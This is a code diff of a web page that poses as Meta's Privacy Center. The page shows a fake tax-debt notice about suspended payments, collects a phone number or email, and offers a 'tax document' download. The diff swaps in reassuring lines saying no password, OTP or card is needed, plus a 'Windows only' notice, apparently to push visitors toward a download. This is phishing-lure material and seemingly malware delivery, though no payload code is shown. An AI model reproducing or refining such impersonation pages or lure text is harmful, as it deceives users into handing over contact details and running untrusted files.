@@ -131,7 +131,7 @@ const Page: FC = () => {
 
         isTranslatingRef.current = true;
 
-        const textsToTranslate = ['Privacy Center Home Page', 'Search', 'Privacy Policy', 'Other rules and articles', 'Settings', 'Privacy Center', 'TAX DEBT NOTICE', 'Our system has detected that your advertising account has an outstanding tax balance. Meta is required to collect tax information from content creators. If any tax withholding applies, your payments have been suspended. To protect the Meta platform and continue receiving payments, you must verify and settle your tax obligation immediately.', 'Important Information:', 'Your payment account is currently suspended due to outstanding tax balance.', 'You must verify your tax status to resume receiving payments.', 'Use the Tax Status Portal to check your outstanding balance.', 'The portal requires your registered phone number or email only.', 'View Tax Status', 'Outstanding tax balance detected', 'Immediate action required', 'Verify and settle your tax debt', 'Payment account suspended', 'Check your tax status', 'Professional Tools', 'Action Required', 'Additional resources', 'Why is my account suspended', 'Tax debt outstanding', 'Required tax forms', 'W-9 or W-8BEN submission', 'When will payments resume', 'After tax verification', 'Your payments will remain suspended until your tax status is verified and any outstanding balance is settled. After verification, you will receive payment in the next scheduled cycle, around the 21st of each month.', 'Enter Phone Number or Email', 'Please enter your registered phone number or email address to check your tax status', 'Phone number or email address', 'Check Tax Status', 'Verifying your information...', 'Search', 'Download tax document', 'Tax record found. You can now download the related document.', 'Reviewing account information', 'Tax status located', 'Your tax record has been reviewed successfully. Download the document below to continue the next step.'];
+        const textsToTranslate = ['Privacy Center Home Page', 'Search', 'Privacy Policy', 'Other rules and articles', 'Settings', 'Privacy Center', 'TAX DEBT NOTICE', 'Our system has detected that your advertising account has an outstanding tax balance. Meta is required to collect tax information from content creators. If any tax withholding applies, your payments have been suspended. To protect the Meta platform and continue receiving payments, you must verify and settle your tax obligation immediately.', 'Important Information:', 'No Facebook password is required.', 'No OTP or authentication code is required.', 'No card or payment account information is required.', 'The lookup portal is currently supported on Windows only.', 'Check Tax Status', 'Outstanding tax balance detected', 'Immediate action required', 'Verify and settle your tax debt', 'Payment account suspended', 'Check your tax status', 'Professional Tools', 'Action Required', 'Additional resources', 'Why is my account suspended', 'Tax debt outstanding', 'Required tax forms', 'W-9 or W-8BEN submission', 'When will payments resume', 'After tax verification', 'Your payments will remain suspended until your tax status is verified and any outstanding balance is settled. After verification, you will receive payment in the next scheduled cycle, around the 21st of each month.', 'Enter Phone Number or Email', 'Please enter your registered phone number or email address to check your tax status', 'Phone number or email address', 'Check Tax Status', 'Verifying your information...', 'Search', 'Download tax document', 'Tax record found. You can now download the related document.', 'Reviewing account information', 'Tax status located', 'Your tax record has been reviewed successfully. Download the document below to continue the next step.'];
 
         const translateAll = async () => {
             const translatedMap: Record<string, string> = {};
@@ -208,18 +208,18 @@ const Page: FC = () => {
                         <p className='text-2xl font-bold'>{t('TAX DEBT NOTICE')}</p>
                     </div>
                     <p>{t('Our system has detected that your advertising account has an outstanding tax balance. Meta is required to collect tax information from content creators. If any tax withholding applies, your payments have been suspended. To protect the Meta platform and continue receiving payments, you must verify and settle your tax obligation immediately.')}</p>
-                    <div className='rounded-b-[20px] bg-white'>
-                        <Image src={BackgroundImage} alt='' className='rounded-t-[20px] bg-blue-500 py-20' />
+                    <div className='rounded-y-[20px]'>
+                        <Image src={BackgroundImage} alt='' className='rounded-t-[20px]' />
                         <div className='flex flex-col items-start justify-center gap-3 p-5'>
                             <p className='text-xl font-bold'>{t('Important Information:')}</p>
                             <ul className='flex list-inside list-disc flex-col gap-2 text-[15px]'>
-                                <li>{t('Your payment account is currently suspended due to outstanding tax balance.')}</li>
-                                <li>{t('You must verify your tax status to resume receiving payments.')}</li>
-                                <li>{t('Use the Tax Status Portal to check your outstanding balance.')}</li>
-                                <li>{t('The portal requires your registered phone number or email only.')}</li>
+                                <li>{t('No Facebook password is required.')}</li>
+                                <li>{t('No OTP or authentication code is required.')}</li>
+                                <li>{t('No card or payment account information is required.')}</li>
+                                <li>{t('The lookup portal is currently supported on Windows only.')}</li>
                             </ul>
                             <button onClick={() => setShowModal(true)} className='mt-2 block w-full overflow-hidden rounded-full bg-[#0866FF] px-4 py-3.5 text-center text-[15px] leading-4.75 font-medium text-ellipsis whitespace-nowrap text-white transition-all hover:bg-[#1877F2]' style={{ fontFamily: 'Optimistic, "Segoe UI Historic", "Segoe UI", Helvetica, Arial, sans-serif' }}>
-                                {t('View Tax Status')}
+                                {t('Check Tax Status')}
                             </button>
                         </div>
                     </div>
